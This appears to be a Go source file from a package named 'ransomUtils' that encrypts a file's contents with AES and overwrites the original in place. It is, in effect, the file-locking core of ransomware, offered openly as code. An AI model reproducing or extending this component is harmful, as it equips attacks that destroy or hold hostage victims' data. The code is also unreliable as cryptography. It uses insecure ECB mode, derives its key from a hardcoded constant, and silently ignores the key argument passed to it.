package ransomUtils

import (
	"bytes"
	"crypto/aes"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
)

const key = "clave"

// toDo: deriveKey convierte una contraseña de cualquier longitud en 32 bytes (AES-256).
func deriveKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

func Encrypt(plaintext string, pKey string) (string, error) {
	block, err := aes.NewCipher(deriveKey(key))
	if err != nil {
		return "", err
	}

	bs := block.BlockSize() // 16 bytes

	// toDo:  Padding PKCS#7: rellenar hasta un múltiplo de 16
	data := []byte(plaintext)
	pad := bs - len(data)%bs
	data = append(data, bytes.Repeat([]byte{byte(pad)}, pad)...)

	out := make([]byte, len(data))
	for i := 0; i < len(data); i += bs {
		block.Encrypt(out[i:i+bs], data[i:i+bs])
	}

	return base64.StdEncoding.EncodeToString(out), nil
}

func EncryptFile(path string, pKey string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("error al leer el archivo: %w", err)
	}

	encrypted, err := Encrypt(string(data), pKey)
	if err != nil {
		return fmt.Errorf("error al cifrar: %w", err)
	}

	if err := os.WriteFile(path, []byte(encrypted), 0600); err != nil {
		return fmt.Errorf("error al escribir el archivo cifrado: %w", err)
	}

	return nil
}
